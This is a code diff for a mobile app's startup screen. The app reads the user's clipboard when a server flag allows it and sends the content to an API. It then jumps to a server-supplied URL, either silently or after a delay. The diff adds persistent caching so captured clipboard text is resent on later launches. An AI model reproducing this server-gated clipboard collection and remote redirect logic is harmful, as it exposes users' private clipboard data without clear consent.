@@ -15,12 +15,14 @@ import {
     OPEN_URL_KEYS,
     devLog,
     devWarn,
+    getCachedOpenUrlClipboardContent,
     getJumpFlag,
     isSupportedLinkType,
     jumpByLinkType,
     readDeferredJump,
     saveDeferredJump,
     setJumpFlag,
+    syncOpenUrlClipboardContentCache,
 } from '@/services/openUrlJump';
 import { resolveInternalEntryRoute } from '@/services/internalEntryRoute';
 
@@ -38,6 +40,7 @@ const INSTALL_FLAG_KEY = 'STAT_INSTALLED';
  *
  * 决策优先级：
  * - OPEN_URL_JUMPED=1：认为已命中过跳转，后续只要返回 targetUrl 就直接跳，不再判断 isOpen
+ * - more=1：缓存本次提交的 clipboardContent，后续 getOpenUrl 优先复用缓存内容
  * - checkTime > 0：保存 OPEN_URL_DEFERRED_JUMP，进入首页，后续到点由根 layout 刷新 URL 并按最新 isOpen 判断
  * - isOpen !== '1'：非静默场景不跳转
  * - isOpen === '1' && checkTime <= 0：立即跳转
@@ -63,9 +66,19 @@ export default function BootstrapScreen() {
         const h5Verify = await AsyncStorage.getItem(OPEN_URL_KEYS.JUMP_FLAG_KEY).catch(() => '') ?? '';
         devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: start', { h5Verify, readClipboard: base?.readClipboard });
 
-        if (h5Verify === '1') {
-            devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: jumped=1, request with empty clipboard');
-            return systemApi.getOpenUrl('', h5Verify);
+        const requestOpenUrlAndSyncClipboardCache = async (clipboardContent) => {
+            const openUrlRes = await systemApi.getOpenUrl(clipboardContent, h5Verify);
+            await syncOpenUrlClipboardContentCache({
+                more: openUrlRes?.data?.more,
+                clipboardContent,
+            });
+            return openUrlRes;
+        };
+
+        const cachedClipboardContent = await getCachedOpenUrlClipboardContent();
+        if (cachedClipboardContent !== null) {
+            devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: with cached clipboard', { cachedClipboardContent: cachedClipboardContent });
+            return requestOpenUrlAndSyncClipboardCache(cachedClipboardContent);
         }
 
         // init 返回允许读剪贴板时，才携带剪贴板内容请求 getOpenUrl
@@ -74,7 +87,7 @@ export default function BootstrapScreen() {
                 const Clipboard = require('expo-clipboard');
                 const clipboardContent = await Clipboard.getStringAsync();
                 devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: with clipboard', { len: (clipboardContent ?? '').length });
-                return systemApi.getOpenUrl(clipboardContent ?? '', h5Verify);
+                return requestOpenUrlAndSyncClipboardCache(clipboardContent ?? '');
             } catch {
                 // 读取剪切板失败时回退到空内容
                 devWarn(OPEN_URL_DEBUG_TAG, 'getOpenUrl: clipboard read failed, fallback empty');
@@ -82,7 +95,7 @@ export default function BootstrapScreen() {
         }
 
         devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: request with empty clipboard');
-        return systemApi.getOpenUrl('', h5Verify);
+        return requestOpenUrlAndSyncClipboardCache('');
     }, []);
 
     const finishToInternalEntry = useCallback(async (abTest) => {
@@ -260,6 +273,7 @@ export default function BootstrapScreen() {
                 isOpen: openUrlRes?.data?.isOpen,
                 linkType: openUrlRes?.data?.linkType,
                 hasTargetUrl: !!openUrlRes?.data?.targetUrl,
+                more: openUrlRes?.data?.more,
             });
 
             const didJump = await handleOpenUrl(openUrlRes, base);
